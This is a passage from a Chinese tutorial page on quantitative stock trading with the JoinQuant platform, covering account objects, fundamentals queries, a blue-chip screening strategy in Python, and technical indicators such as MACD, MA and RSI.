class="built_in">type</span>(context.portfolio.long_positions))</span><br><span class="line">    long_positions_dict = context.portfolio.long_positions</span><br><span class="line">    <span class="keyword">for</span> position <span class="keyword">in</span> <span class="built_in">list</span>(long_positions_dict.values()):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;&quot;&quot;标：<span class="subst">&#123;position.security&#125;</span>，总仓位：<span class="subst">&#123;position.total_amount&#125;</span></span></span><br><span class="line"><span class="string">        ，标的价值：<span class="subst">&#123;position.value&#125;</span>，建仓时间：<span class="subst">&#123;position.init_time&#125;</span>&quot;&quot;&quot;</span>)</span><br></pre></td></tr></table></figure>

<h2 id="账户信息"><a href="#账户信息" class="headerlink" title="账户信息"></a>账户信息</h2><p>**portfolio对象：**总帐户信息</p>
<ul>
<li><strong>long_positions</strong>: 多单的仓位，一个字典，key 是证券代码，value 是 [Position] 对象。</li>
<li><strong>short_positions</strong>: 空单的仓位，一个字典，key 是证券代码，value 是 [Position] 对象。</li>
<li><strong>total_value</strong>: 总的权益，包括现金、保证金（期货）或者仓位（股票）的总价值，可用于计算收益。</li>
<li><strong>returns</strong>: 总权益的累计收益；（当前总资产 + 今日出入金 - 昨日总资产）&#x2F; 昨日总资产。</li>
<li><strong>starting_cash</strong>: 初始资金，现在等于 <code>inout_cash</code>。</li>
<li><strong>positions_value</strong>: 持仓价值。</li>
</ul>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> jqdata <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">initialize</span>(<span class="params">context</span>):</span><br><span class="line">    <span class="comment">#设定业绩比较基准</span></span><br><span class="line">    set_benchmark(<span class="string">&#x27;000300.XSHG&#x27;</span>)</span><br><span class="line">    g.security = <span class="string">&quot;000001.XSHE&quot;</span>  <span class="comment"># 深交所平安银行</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">handle_data</span>(<span class="params">context, data</span>):</span><br><span class="line">    <span class="comment">#如果没有持仓</span></span><br><span class="line">    <span class="keyword">if</span> g.security <span class="keyword">not</span> <span class="keyword">in</span> context.portfolio.positions:</span><br><span class="line">        order(g.security,<span class="number">1000</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        order(g.security,-<span class="number">800</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;&quot;&quot;多单的仓位：&#123;&#125;&quot;&quot;&quot;</span>,<span class="built_in">format</span>(context.portfolio.long_positions))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;&quot;&quot;空单的仓位：&#123;&#125;&quot;&quot;&quot;</span>,<span class="built_in">format</span>(context.portfolio.short_positions))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;&quot;&quot;总权益：&#123;&#125;&quot;&quot;&quot;</span>,<span class="built_in">format</span>(context.portfolio.total_value))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;&quot;&quot;总权益的累计收益：&#123;&#125;&quot;&quot;&quot;</span>,<span class="built_in">format</span>(context.portfolio.returns))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;&quot;&quot;初始资金：&#123;&#125;&quot;&quot;&quot;</span>,<span class="built_in">format</span>(context.portfolio.starting_cash))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;&quot;&quot;持仓价值：&#123;&#125;&quot;&quot;&quot;</span>,<span class="built_in">format</span>(context.portfolio.positions_value))</span><br></pre></td></tr></table></figure>

<p>**subportfolio对象：**子账户信息</p>
<ul>
<li><strong>inout_cash</strong>: 累计出入金，如初始资金 1000，后面转移出去 100，则这个值是 1000 - 100。</li>
<li><strong>available_cash</strong>: 可用资金，可以用来购买证券的资金。</li>
<li><strong>transferable_cash</strong>: 可取资金，即可以提取的资金，不包括今日卖出证券所得资金。</li>
<li><strong>locked_cash</strong>: 挂单锁住资金。</li>
<li><strong>type</strong>: 账号所属类型。</li>
</ul>
<p>code:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> jqdata <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">initialize</span>(<span class="params">context</span>):</span><br><span class="line">    <span class="comment">#设定业绩比较基准</span></span><br><span class="line">    set_benchmark(<span class="string">&#x27;000300.XSHG&#x27;</span>)</span><br><span class="line">    g.security = <span class="string">&quot;000001.XSHE&quot;</span>  <span class="comment"># 深交所平安银行</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">handle_data</span>(<span class="params">context, data</span>):</span><br><span class="line">    <span class="comment">#如果没有持仓</span></span><br><span class="line">    <span class="keyword">if</span> g.security <span class="keyword">not</span> <span class="keyword">in</span> context.portfolio.positions:</span><br><span class="line">        order(g.security,<span class="number">1000</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        order(g.security,-<span class="number">800</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;&quot;&quot;累计出入金：&#123;&#125;&quot;&quot;&quot;</span>,<span class="built_in">format</span>(context.subportfolios[<span class="number">0</span>].inout_cash))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;&quot;&quot;可用资金：&#123;&#125;&quot;&quot;&quot;</span>,<span class="built_in">format</span>(context.subportfolios[<span class="number">0</span>].available_cash))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;&quot;&quot;可取资金：&#123;&#125;&quot;&quot;&quot;</span>,<span class="built_in">format</span>(context.subportfolios[<span class="number">0</span>].transferable_cash))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;&quot;&quot;挂单锁住资金：&#123;&#125;&quot;&quot;&quot;</span>,<span class="built_in">format</span>(context.subportfolios[<span class="number">0</span>].locked_cash))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;&quot;&quot;账户所属类型：&#123;&#125;&quot;&quot;&quot;</span>,<span class="built_in">format</span>(context.subportfolios[<span class="number">0</span>].<span class="built_in">type</span>))</span><br></pre></td></tr></table></figure>

<h1 id="量化交易数据获取"><a href="#量化交易数据获取" class="headerlink" title="量化交易数据获取"></a>量化交易数据获取</h1><p>个股K线数据可以直接通过同花顺，聚宽等直接下载</p>
<h2 id="财务数据"><a href="#财务数据" class="headerlink" title="财务数据"></a>财务数据</h2><p>**get_fundamentals(query_object,date&#x3D;None,statDate&#x3D;None)：**查询财务数据</p>
<ul>
<li><strong>注意</strong>: <code>date</code> 和 <code>statDate</code> 参数只能传入一个。</li>
<li>传入 <code>date</code> 时，查询指定日期后能看到的最近（除市值表外为最近一个季度，市值为最近一天）的数据。</li>
<li>传入 <code>statDate</code> 时，查询 <code>statDate</code> 指定的季度或年份的财务数据。</li>
<li><strong>date&#x2F;statdate</strong>: 获取一个字符串（格式类似 ‘2015-10-15’）或 <code>datetime</code> 对象。</li>
<li><strong>query_object</strong>: 一个 <code>sqlalchemy.orm.query.Query</code> 对象，可以通过全局的 <code>query</code> 函数获取。</li>
</ul>
<p><strong>query_object()：<strong>查询数据API，可以是</strong>整张表，也可以是标准的多个字段或计算结果</strong></p>
<ul>
<li><strong>filter</strong>: 填写过滤条件，可以使用逗号分隔多个条件，或使用 <code>and</code>、<code>or</code>。</li>
<li><strong>order_by</strong>: 填写排序条件。</li>
<li><strong>limit</strong>: 限制返回的个数。</li>
<li><strong>group_by</strong>: 进行分组统计。</li>
</ul>
<p>示例：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">query(valuation).<span class="built_in">filter</span>(valuation.code == <span class="string">&#x27;000001.XSHE&#x27;</span>)  <span class="comment"># 查询 &#x27;000001.XSHE&#x27; 的全部市值数据</span></span><br></pre></td></tr></table></figure>

<p>**get_fundamentals_continuously(query_object,end_date&#x3D;None,count&#x3D;None,panel&#x3D;True)：**查询多日的财务数据</p>
<ul>
<li><strong>end_date</strong>: 获取一个字符串（格式类似于 ‘2015-10-15’）或 datetime 对象。</li>
<li><strong>count</strong>: 获取 <code>end_date</code> 前的 <code>count</code> 个日期的数据，<code>count</code> 应小于 500。</li>
<li><strong>panel</strong>: 默认 <code>panel=True</code>，返回一个 <code>pandas.Panel</code>；建议设置 <code>panel=False</code>，返回更有效的 DataFrame。</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> jqdata <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#查询平安银行2022年9月1日</span></span><br><span class="line">q = query(</span><br><span class="line">    valuation</span><br><span class="line">    ).<span class="built_in">filter</span>(</span><br><span class="line">        valuation.code == <span class="string">&#x27;000001.XSHE&#x27;</span></span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">df = get_fundamentals(q,<span class="string">&#x27;2022-09-01&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(df[<span class="string">&#x27;market_cap&#x27;</span>][<span class="number">0</span>])</span><br></pre></td></tr></table></figure>

<h1 id="量化选股-1"><a href="#量化选股-1" class="headerlink" title="量化选股"></a>量化选股</h1><h2 id="量化选股概况"><a href="#量化选股概况" class="headerlink" title="量化选股概况"></a>量化选股概况</h2><ol>
<li><strong>量化选股</strong>: 利用<strong>数量化的方法选择股票组合</strong>，期望该组合能够获得超越基准的投资行为。</li>
<li><strong>技术面选股</strong>: 利用<strong>各种技术理论或技术指标</strong>来分析和预测股票的未来价格走势。</li>
<li><strong>基本面选股</strong>: 通过对上市公司在发展过程中面临的<strong>外部因素</strong>和<strong>自身因素</strong>进行分析，判断该公司的股票是否值得购买。</li>
</ol>
<blockquote>
<p>量化选股注意事项</p>
<ul>
<li>分配多股，减少单股重仓的情况</li>
<li>全面研究个股基本面，增强个股判断逻辑和支撑</li>
<li>主动投资而非被动投资</li>
<li>只是提高胜率的工具之一</li>
</ul>
</blockquote>
<hr>
<blockquote>
<p>白马股选股</p>
<p>一、筛选条件：</p>
<ol>
<li>总市值&gt;50亿（市值较大的公司，流动性好，竞争力强）</li>
<li>上市天数&gt;750（抛开3年以内的次新）</li>
<li>流通盘比例&gt;95%（要全流通，避免解禁压力）</li>
<li>销售毛利率&gt;20%（毛利率要高）</li>
<li>扣非净资产收益率&gt;20%（ROE要高）</li>
</ol>
<p>二、排名条件：</p>
<ol>
<li>总市值从大到小排列</li>
</ol>
</blockquote>
<p>按照上面的策略code:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> jqdata <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"></span><br><span class="line"><span class="comment">##初始化函数，设定要操作的股票、基准等</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">initialize</span>(<span class="params">context</span>):</span><br><span class="line">    <span class="comment">#设定沪深300为基准</span></span><br><span class="line">    set_benchmark(<span class="string">&#x27;000300.XSHG&#x27;</span>)</span><br><span class="line">    <span class="comment">#开启动态复权模式</span></span><br><span class="line">    set_option(<span class="string">&#x27;use_real_price&#x27;</span>,<span class="literal">True</span>)</span><br><span class="line">    <span class="comment">#设定成交量比例</span></span><br><span class="line">    set_option(<span class="string">&#x27;order_volume_ratio&#x27;</span>,<span class="number">1</span>)</span><br><span class="line">    <span class="comment">#设定股票交易手续费</span></span><br><span class="line">    set_order_cost(OrderCost(open_tax=<span class="number">0</span>,close_tax=<span class="number">0.001</span>,</span><br><span class="line">    open_commission=<span class="number">0.0003</span>,close_commission=<span class="number">0.0003</span>,</span><br><span class="line">    close_today_commission=<span class="number">0</span>,min_commission=<span class="number">5</span>),<span class="built_in">type</span>=<span class="string">&#x27;stock&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#设定持仓数量</span></span><br><span class="line">    g.stocknum = <span class="number">20</span></span><br><span class="line">    <span class="comment">#交易日计时器</span></span><br><span class="line">    g.days = <span class="number">20</span></span><br><span class="line">    <span class="comment">#调仓频率</span></span><br><span class="line">    g.refresh_rate = <span class="number">100</span></span><br><span class="line">    <span class="comment">#运行函数</span></span><br><span class="line">    run_daily(trade, <span class="string">&#x27;every_bar&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="comment">##筛选逻辑</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_stocks</span>(<span class="params">context</span>):</span><br><span class="line">    <span class="comment">#设定查询条件</span></span><br><span class="line">    q = query(</span><br><span class="line">        indicator.code,</span><br><span class="line">        valuation.capitalization,</span><br><span class="line">        indicator.roe,</span><br><span class="line">        indicator.gross_profit_margin,</span><br><span class="line">        ).<span class="built_in">filter</span>(</span><br><span class="line">            <span class="comment">#1、总市值&gt;50亿</span></span><br><span class="line">            valuation.capitalization &gt; <span class="number">50</span>,</span><br><span class="line">            <span class="comment">#3、流通盘比率大于95%</span></span><br><span class="line">            valuation.circulating_market_cap &gt; valuation.market_cap*<span class="number">0.95</span>,</span><br><span class="line">            <span class="comment">#4、销售毛利率&gt;20%</span></span><br><span class="line">            indicator.gross_profit_margin &gt; <span class="number">20</span>,</span><br><span class="line">            <span class="comment">#5、ROE &gt; 20%</span></span><br><span class="line">            indicator.roe &gt; <span class="number">20</span>,</span><br><span class="line">            ).order_by(</span><br><span class="line">                <span class="comment">#按照市值倒序</span></span><br><span class="line">                valuation.market_cap.desc()</span><br><span class="line">                ).limit(</span><br><span class="line">                    <span class="number">100</span></span><br><span class="line">                    )</span><br><span class="line">    df = get_fundamentals(q,statDate=<span class="built_in">str</span>(context.current_dt)[:<span class="number">4</span>])</span><br><span class="line">    buylist = <span class="built_in">list</span>(df[<span class="string">&#x27;code&#x27;</span>])</span><br><span class="line">    <span class="comment">#2、上市天数&gt;750</span></span><br><span class="line">    buylist = delect_stock(buylist,context.current_dt,<span class="number">750</span>)</span><br><span class="line">    buylist = filter_paused_stock(buylist)[:<span class="number">20</span>]</span><br><span class="line">    <span class="keyword">return</span> buylist</span><br><span class="line">    </span><br><span class="line"><span class="comment">##过滤停牌股票</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">filter_paused_stock</span>(<span class="params">stock_list</span>):</span><br><span class="line">    current_date = get_current_data()</span><br><span class="line">    <span class="keyword">return</span> [stock <span class="keyword">for</span> stock <span class="keyword">in</span> stock_list <span class="keyword">if</span> <span class="keyword">not</span> current_date[stock].paused]</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"><span class="comment">##排除次新</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delect_stock</span>(<span class="params">stocks,begin,n=<span class="number">180</span></span>):</span><br><span class="line">    <span class="comment">#去除上市距begin不足n天的股票</span></span><br><span class="line">    stockList=[]</span><br><span class="line">    <span class="keyword">for</span> stock <span class="keyword">in</span> stocks:</span><br><span class="line">        start_date = get_security_info(stock).start_date</span><br><span class="line">        <span class="keyword">if</span> start_date &lt; (begin - timedelta(days=n)).date():</span><br><span class="line">            stockList.append(stock)</span><br><span class="line">            </span><br><span class="line">    <span class="keyword">return</span> stockList</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">trade</span>(<span class="params">context</span>):</span><br><span class="line">    <span class="keyword">if</span> g.days % g.refresh_rate == <span class="number">0</span>:</span><br><span class="line">        <span class="comment">#白马股选股</span></span><br><span class="line">        stockList = check_stocks(context)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;&quot;&quot;stockList:&#123;&#125;&quot;&quot;&quot;</span>,<span class="built_in">format</span>(stockList))</span><br><span class="line">        <span class="comment">#获取持仓列表</span></span><br><span class="line">        sell_list = <span class="built_in">list</span>(context.portfolio.positions.keys())</span><br><span class="line">        </span><br><span class="line">        sells = <span class="built_in">list</span>(<span class="built_in">set</span>(sell_list).difference(<span class="built_in">set</span>(stockList)))</span><br><span class="line">        </span><br><span class="line">        <span class="comment">#先卖再买</span></span><br><span class="line">        <span class="keyword">for</span> stock <span class="keyword">in</span> sells:</span><br><span class="line">            order_target_value(stock,<span class="number">0</span>)</span><br><span class="line">            </span><br><span class="line">        <span class="comment">#分配资金</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(context.portfolio.positions) &lt; g.stocknum:</span><br><span class="line">            num = g.stocknum - <span class="built_in">len</span>(context.portfolio.positions)</span><br><span class="line">            cash = context.portfolio.cash / num</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            cash = <span class="number">0</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> stock <span class="keyword">in</span> stockList:</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(context.portfolio.positions) &lt; g.stocknum <span class="keyword">and</span> stock <span class="keyword">not</span> <span class="keyword">in</span> context.portfolio.positions:</span><br><span class="line">                    order_value(stock,cash)</span><br><span class="line">                </span><br><span class="line">        <span class="comment">#更新天数计数器</span></span><br><span class="line">        g.days = <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        g.days += <span class="number">1</span></span><br></pre></td></tr></table></figure>

<h2 id="营收因子"><a href="#营收因子" class="headerlink" title="营收因子"></a>营收因子</h2><ol>
<li><strong>财务因素</strong>: 通常包括成长类因素、价值类因素以及质量类因素。</li>
<li><strong>成长类因素</strong>: 在财务因素选股中，常用的方法是选择成长类因素进行选股，包括营收因素与利润因素。</li>
<li><strong>规模类因素</strong>: 反映公司规模情况，主要用于体现市场价值大小，对投资收益产生影响，包括总市值和流通市值</li>
<li><strong>价值类因素</strong>: 价值投资是一种长期的投资策略，通常是购买那些相对低估的股票，主要基于基本面标准。价值类因素包括市净率、市销率，以及市盈率等指标。</li>
<li><strong>质量类因素</strong>: 质量类因素与股票的财务质量、资本结构相关，主要用于评估公司整体的财务健康状态。质量类因素包括净资产收益率，以及总资产净利率等指标。</li>
</ol>
<h1 id="量化择时"><a href="#量化择时" class="headerlink" title="量化择时"></a>量化择时</h1><p>概述：采用量化的方式判断买点和卖点</p>
<p><strong>趋势量化择时</strong>——基本思想基于<strong>技术分析</strong>，前提时你得承认有一定的规律（那三个假设）</p>
<p><strong>市场情绪量化择时</strong>——利用投资者的热情程度来判断大势方向</p>
<p>后者舍去（一堆散户在哪里他能涨吗）</p>
<p>前者：通过考虑市场的多个方面建立一个数学模型，并给出完整的数学公式</p>
<ol>
<li>技术趋势指标是识别和追踪有趋势的图形类指标，其特点是<strong>不试图捕捉顶底</strong>，如均线指标、MACD指标等。</li>
<li>反趋势指标又称为<strong>振荡指标</strong>，是识别和追踪趋势运行的转折点的图形类指标，其特点是<strong>具有强烈的顶底</strong>的意义，对市场转折点较敏感，如随机指标KDJ、强弱指标RSI等。</li>
<li>压力支撑指标，又称通道指标，是通过顶部轨道线和底部轨道线，试图捕捉行情的顶部和底部的图形类指标，其特点是具<strong>有明显的压力线，也有明显的支撑线</strong>，如布林带 BOLL 指标、XS 藤斯通道指标。</li>
<li>量价指标就是通过成交量变动来分析价格未来走势的图形类指标，其特点是<strong>分析成交量与价格波动的关系</strong>，如 OBV 能量潮指标、VOL 成交量指标等。</li>
</ol>
<h2 id="趋势指标"><a href="#趋势指标" class="headerlink" title="趋势指标"></a>趋势指标</h2><h3 id="MACD-1"><a href="#MACD-1" class="headerlink" title="MACD"></a>MACD</h3><p>即平滑异同移动平均线，是由美国投资家杰拉尔德·阿佩尔在 20 世纪 70 年代末提出的，主要表示经过平滑处理后线的差异程度。一般用来判断<strong>股票价格变化的方向、强度和趋势</strong>。</p>
<p>快线 DIFF 上穿慢线 DEA，<strong>红柱出现的第一天</strong>，称为<strong>金叉</strong>，是买进持有的时机；</p>
<p>快线 DIFF 下穿慢线 DEA，<strong>绿柱出现的第一天</strong>，称为<strong>死叉</strong>，是卖出空仓的时机。</p>
<p><code>MACD(security_list, check_date, SHORT = 12, LONG = 26, MID = 9)</code></p>
<p><strong>参数：</strong></p>
<ul>
<li>security_list：标的列表</li>
<li>check_date：要查询数据的日期</li>
<li>SHORT：统计的天数 SHORT</li>
<li>LONG：统计的天数 LONG</li>
<li>MID：统计的天数 MID</li>
<li>unit：统计周期，默认为 ‘1d’, 支持如下周期: ‘1m’, ‘5m’, ‘15m’, ‘30m’, ‘60m’, ‘120m’, ‘1d’, ‘1w’, ‘1M’. ‘1w’ 表示一周, ‘1M’ 表示一月</li>
<li>include_now：是否包含当前周期，默认为 True</li>
<li>fq_ref_date：复权基准日，默认为 None</li>
</ul>
<p><strong>返回：</strong></p>
<ul>
<li>DIF, DEA和MACD的值</li>
</ul>
<p><strong>返回结果类型：</strong></p>
<ul>
<li>字典(dict)：键(key)为标的代码，值(value)为数据。</li>
<li>如：({‘000001.XSHE’: 0.024474457964069884, ‘603177.XSHG’: nan, ‘000002.XSHE’: 1.9534717416190936, ‘601211.XSHG’: -0.13735007291032986}, {‘000001.XSHE’: 0.031674925444633864, ‘603177.XSHG’: nan, ‘000002.XSHE’: 1.4784672678080988, ‘601211.XSHG’: -0.020490844872792721}, {‘000001.XSHE’: -0.014400934961127959, ‘603177.XSHG’: nan, ‘000002.XSHE’: 0.95000894762198973, ‘601211.XSHG’: -0.23371845607507427})</li>
</ul>
<p><strong>备注：</strong></p>
<ul>
<li>计算方式与通达信、东方财富和同花顺相同</li>
</ul>
<p><strong>用法注释：</strong></p>
<p>DIFF线　收盘价短期、长期指数平滑移动平均线间的差 DEA线　 DIFF线的M日指数平滑移动平均线 MACD线　DIFF线与DEA线的差，彩色柱状线 参数：SHORT(短期)、LONG(长期)、M 天数，一般为12、26、9</p>
<p>用法： 1.DIFF、DEA均为正，DIFF向上突破DEA，买入信号。 2.DIFF、DEA均为负，DIFF向下跌破DEA，卖出信号。 3.DEA线与K线发生背离，行情反转信号。 4.分析MACD柱状线，由红变绿(正变负)，卖出信号；由绿变红，买入信号</p>
<p><strong>示例：</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 定义股票池列表</span></span><br><span class="line">security_list1 = <span class="string">&#x27;000001.XSHE&#x27;</span></span><br><span class="line">security_list2 = [<span class="string">&#x27;000001.XSHE&#x27;</span>,<span class="string">&#x27;000002.XSHE&#x27;</span>,<span class="string">&#x27;601211.XSHG&#x27;</span>,<span class="string">&#x27;603177.XSHG&#x27;</span>]</span><br><span class="line"><span class="comment"># 计算并输出 security_list1 的 MACD 值</span></span><br><span class="line">macd_dif, macd_dea, macd_macd = MACD(security_list1,check_date=<span class="string">&#x27;2017-01-04&#x27;</span>, SHORT = <span class="number">12</span>, LONG = <span class="number">26</span>, MID = <span class="number">9</span>)</span><br><span class="line"><span class="built_in">print</span> macd_dif[security_list1]</span><br><span class="line"><span class="built_in">print</span> macd_dea[security_list1]</span><br><span class="line"><span class="built_in">print</span> macd_macd[security_list1]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出 security_list2 的 MACD 值</span></span><br><span class="line">macd_dif, macd_dea, macd_macd = MACD(security_list2,check_date=<span class="string">&#x27;2017-01-04&#x27;</span>, SHORT = <span class="number">12</span>, LONG = <span class="number">26</span>, MID = <span class="number">9</span>)</span><br><span class="line"><span class="keyword">for</span> stock <span class="keyword">in</span> security_list2:</span><br><span class="line">    <span class="built_in">print</span> macd_dif[stock]</span><br><span class="line">    <span class="built_in">print</span> macd_dea[stock]</span><br><span class="line">    <span class="built_in">print</span> macd_macd[stock]</span><br></pre></td></tr></table></figure>

<h3 id="UOS"><a href="#UOS" class="headerlink" title="UOS"></a>UOS</h3><p>即终极波动指标。UOS指标是一种多功能的指标，除了超买超卖方面的作用之外，它的“突破”讯号不仅可以提供最适当的交易时机之外，更可以进一步强化指标的可靠度。</p>
<ol>
<li><p>TH &#x3D; 今日最高价和昨日收盘价的较大值  </p>
</li>
<li><p>TL &#x3D; 今日最低价和昨日收盘价的较小值  </p>
</li>
<li><p>ACCC1 &#x3D; (收盘价 - TL) 的 N1 日累和 &#x2F; (TH - TL) 的 N1 日累和<br>ACCC2 &#x3D; (收盘价 - TL) 的 N2 日累和 &#x2F; (TH - TL) 的 N2 日累和<br>ACCC3 &#x3D; (收盘价 - TL) 的 N3 日累和 &#x2F; (TH - TL) 的 N3 日累和  </p>
</li>
<li><p>UOS &#x3D; (ACCC1 * N2 * N3 + ACCC2 * N1 * N3 + ACCC3 * N1 * N2) * 100 &#x2F; (N1 * N2 + N1 * N3 + N2 * N3)  </p>
</li>
<li><p>MAUOS &#x3D; UOS 的 M 日指数平滑移动平均  </p>
</li>
<li><p>参考 N1 &#x3D; 7, N2 &#x3D; 14, N3 &#x3D; 28, M &#x3D; 6</p>
</li>
</ol>
<ul>
<li>UOS短线拐底：UOS上穿50  </li>
<li>UOS短线卖顶：UOS下穿65  </li>
<li>UOS中长期拐底：UOS上穿35  </li>
<li>UOS中长期卖顶：UOS下穿70</li>
</ul>
<p><a href="https://www.joinquant.com/help/api/help#UOS-%E7%BB%88%E6%9E%81%E6%8C%87%E6%A0%87">参考代码</a></p>
<h3 id="MA"><a href="#MA" class="headerlink" title="MA"></a>MA</h3><p><strong>均线——葛兰碧法则</strong></p>
<ul>
<li><p>平均线从下下降逐渐转为走平，而价格从下方突破平均线，为买进信号  </p>
</li>
<li><p>价格虽然跌破平均线，但是又立刻回升到平均线上，此时平均线仍然持续上涨，仅为买进信号  </p>
</li>
<li><p>价格趋势走在平均线上，价格下跌并未跌破平均线且立刻反转上升，为买进信号  </p>
</li>
<li><p>价格突然暴跌，跌破平均线，且远离平均线，则有可能反弹上升，为买进时机  </p>
</li>
<li><p>平均线从上升逐渐转为盘局或下跌，而价格向下跌破平均线，为卖出信号  </p>
</li>
<li><p>价格虽然向上突破平均线，但是又立刻回跌至平均线下，此时平均线仍然持续的下降，仅为卖出信号  </p>
</li>
<li><p>价格趋势走在平均线下，价格上升并未突破平均线且立刻反转下跌，也是卖出信号  </p>
</li>
<li><p>价格突然暴涨，突破平均线，且远离平均线，则有可能反弹回调，也为卖出时机</p>
</li>
</ul>
<p>看看就好</p>
<p><code>MA(security_list, check_date, timeperiod=5, unit = &#39;1d&#39;, include_now = True, fq_ref_date = None)</code></p>
<p><strong>参数：</strong></p>
<ul>
<li>security_list：标的列表</li>
<li>check_date：要查询数据的日期</li>
<li>timeperiod：统计的天数timeperiod</li>
<li>unit：统计周期，默认为 ‘1d’, 支持如下周期: ‘1m’, ‘5m’, ‘15m’, ‘30m’, ‘60m’, ‘120m’, ‘1d’, ‘1w’, ‘1M’. ‘1w’ 表示一周, ‘1M’ 表示一月</li>
<li>include_now：是否包含当前周期，默认为 True</li>
<li>fq_ref_date：复权基准日，默认为 None</li>
</ul>
<p><strong>返回：</strong></p>
<ul>
<li>MA 的值。</li>
</ul>
<p><strong>返回结果类型：</strong></p>
<ul>
<li>字典(dict)：键(key)为标的代码，值(value)为数据。</li>
<li>如：{‘000001.XSHE’: 9.2599999999999998, ‘603177.XSHG’: nan, ‘000002.XSHE’: 20.68, ‘601211.XSHG’: 18.704000000000001}</li>
</ul>
<p><strong>备注：</strong></p>
<ul>
<li>计算方式与通达信，同花顺和东方财富相同</li>
</ul>
<p><strong>用法注释：</strong></p>
<p>1.股价高于平均线，视为强势；股价低于平均线，视为弱势 2.平均线向上涨升，具有助涨力道；平均线向下跌降，具有助跌力道； 3.二条以上平均线向上交叉时，买进； 4.二条以上平均线向下交叉时，卖出； 5.移动平均线的信号经常落后股价，若以EXPMA 、VMA 辅助，可以改善。</p>
<h3 id="VMA"><a href="#VMA" class="headerlink" title="VMA"></a>VMA</h3><p>变异平均线</p>
<p><code>VMA(security_list, check_date, timeperiod = 12, unit = &#39;1d&#39;, include_now = True, fq_ref_date = None)</code></p>
<p><strong>参数：</strong></p>
<ul>
<li>security_list：标的列表</li>
<li>check_date: 要查询数据的日期</li>
<li>timeperiod：统计的天数</li>
<li>unit：统计周期，默认为 ‘1d’, 支持如下周期: ‘1m’, ‘5m’, ‘15m’, ‘30m’, ‘60m’, ‘120m’, ‘1d’, ‘1w’, ‘1M’. ‘1w’ 表示一周, ‘1M’ 表示一月</li>
<li>include_now：是否包含当前周期，默认为 True</li>
<li>fq_ref_date：复权基准日，默认为 None</li>
</ul>
<p><strong>返回：</strong></p>
<ul>
<li>VMA的值</li>
</ul>
<p><strong>返回结果类型：</strong></p>
<ul>
<li>字典(dict)：键(key)为标的代码，值(value)为数据。</li>
<li>如：{‘000001.XSHE’: 8.3202083333333334, ‘603177.XSHG’: nan, ‘000002.XSHE’: 18.979166666666668, ‘601211.XSHG’: 16.474166666666669}</li>
</ul>
<p><strong>备注：</strong></p>
<ul>
<li>计算方式与通达信和同花顺相同，东方财富没有该指标</li>
</ul>
<p><strong>用法注释：</strong></p>
<ol>
<li>股价高于平均线，视为强势；股价低于平均线，视为弱势；</li>
<li>平均线向上涨升，具有助涨力道；平均线向下跌降，具有助跌力道；</li>
<li>二条以上平均线向上交叉时，买进；</li>
<li>二条以上平均线向下交叉时，卖出；</li>
<li>VMA 比一般平均线的敏感度更高，消除了部份平均线落后的缺陷。</li>
</ol>
<h2 id="反趋向指标"><a href="#反趋向指标" class="headerlink" title="反趋向指标"></a>反趋向指标</h2><h3 id="RSI"><a href="#RSI" class="headerlink" title="RSI"></a>RSI</h3><p><strong>RSI</strong>:即相对强弱指标，是期货市场和股票市场中最为著名的动量指标。显示的是股价向上波动的幅度占总的波动幅度的百分比。如果其数值大，就表示市场处于强势状态，如果数值小，则表示市场处于弱势。</p>
<p>计算公式：NRSI &#x3D; A &#x2F; (A + B) × 100</p>
<p>A &#x3D; N日内上涨的平均值之和；B &#x3D; N日内下跌的平均值之和（取正值）</p>
